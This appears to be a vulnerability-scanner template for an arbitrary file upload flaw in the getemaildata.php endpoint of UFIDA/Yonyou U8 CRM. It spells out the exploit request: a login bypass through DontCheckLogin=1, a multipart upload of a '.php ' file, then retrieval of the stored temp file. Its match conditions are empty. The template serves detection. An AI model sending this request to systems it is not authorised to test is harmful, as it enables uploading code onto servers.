id: yonyou-u8-crm-fileupload
brief:
    title: UFIDA U8-CRM getemaildata - Arbitary File Upload
    by: SleepingBag945
    level: critical
    about: There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerabi...
    label:
        - yonyou
        - file-upload
        - u8-crm
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/ajax/getemaildata.php?DontCheckLogin=1'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Cache-Control: max-age=0
        Content-Length: "300"
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP
        Cookie: PHPSESSID=ibru7pqnplhi720caq0ev8uvt0
        Origin: "null"
        Upgrade-Insecure-Requests: "1"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
      body: |-
        ------WebKitFormBoundaryAVuAKsvesmnWtgEP
        Content-Disposition: form-data; name="file"; filename="%s.php "
        Content-Type: application/octet-stream

        {{randstr}}
        ------WebKitFormBoundaryAVuAKsvesmnWtgEP
        Content-Disposition: form-data; name="upload"

        upload
        ------WebKitFormBoundaryAVuAKsvesmnWtgEP--
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/tmpfile/{{path}}.tmp.mht'
      signs: []
